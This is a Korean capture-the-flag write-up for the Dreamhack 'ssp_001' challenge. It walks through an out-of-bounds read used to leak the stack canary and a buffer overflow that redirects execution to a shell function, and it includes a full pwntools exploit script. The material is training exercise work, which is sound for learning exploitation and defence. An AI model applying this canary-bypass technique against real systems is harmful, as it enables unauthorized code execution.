# ssp_001 - Dreamhack
## Challenge Info
- Date: 2025-08-01
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: ssp_001.c, ssp_001(ELF)
- tools: gdb(pwndbg)
## Brief Description
이 문제는 작동하고 있는 서비스(ssp_001)의 바이너리와 소스코드가 주어집니다.
프로그램의 취약점을 찾고 SSP 방어 기법을 우회하여 익스플로잇해 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.
## Initial Analysis
### Environment
``` sh
checksec --file=ssp_001

Ubuntu:     16.04
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
### Code
``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}
int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
}
```
### main() 
다음의 3가지 기능를 제공한다.  
- [F]ill the box: `box` 버퍼에 최대 0x40 만큼 데이터를 쓴다.
- [P]rint the box: `box` 버퍼에서 사용자가 원하는 위치의 값을 1byte 읽는다.
- [E]xit: 사용자로부터 `name_len`을 입력받고 그 길이만큼 `name`에 데이터를 작성한다.  

### get_shell() 
``` c
void get_shell() {
    system("/bin/sh");
}
```
이번 문제는 쉘을 얻는 함수가 기본적으로 제공된다.  
## Vulnerability
### OOB(Out Of Bounds)
``` c
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}

// main 일부
case 'P':
    printf("Element index : ");
    scanf("%d", &idx);
    print_box(box, idx);
    break;
```
`idx` 변수의 값을 검증하지 않아서 OOB 취약점이 발생한다. `box` 버퍼를 넘어 상위 데이터를 읽을 수 있다.  
### BOF(Buffer Overflow)
``` c
case 'E':
    printf("Name Size : ");
    scanf("%d", &name_len);
    printf("Name : ");
    read(0, name, name_len);
    return 0;
```
`name_len`을 사용자가 직접 입력할 수 있기 때문에, BOF 취약점이 발생한다. `name` 버퍼를 넘어서 상위 데이터를 덮을 쓸 수 있다.  
## Exploit
### Strategy
`box`의 OOB 취약점을 이용해 카나리 값을 읽은 후, `name`으로 `ra`에 `get_shell`의 주소를 BOF할 때 카나리를 우회할 수 있도록 알맞은 위치에 읽어온 카나리 값을 삽입.
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
| ra | +0x4 |
| ebp |  |
| dummy | -0x4 |
| canary | -0x8 |
| name | -0x48 |
| box | -0x88 |
| select | -0x8a |
| dummy | -0x8c |
| name_len | -0x90 |
### payload
``` python
from pwn import *

p = remote('host8.dreamhack.games', 17131)
context.arch = "i386"

get_shell_addr = 0x080486b9
name_offset_from_canary = 0x40
name_offset_from_ra = 0x50 # 0x48(name + canary) + 0x4(ebp) + 0x4(ra)

# read canary
leak = 0
canary = []
idx = 0x80
for i in range(4) :
    p.recvuntil(b'> ')
    p.sendline(b'P')
    p.sendline(str(idx + i).encode())
    p.recvuntil(b'is : ')
    leak = int(p.recvline(), 16)
    canary.append(leak) 

canary = bytes(canary)

# debug
log.info(f'Leaked canary: {canary.hex()}')

# payload
payload = b''
payload += b'A' * name_offset_from_canary
payload += canary # 4byte
payload += b'B' * 0x8 # dummy + ebp
payload += p32(get_shell_addr)

# BOF
p.recvuntil(b'> ')
p.sendline(b'E')
p.recvuntil(b'Name Size : ')
p.sendline(str(name_offset_from_ra))
p.recvuntil(b'Name : ')
p.sendline(payload)

# sh
p.interactive()
```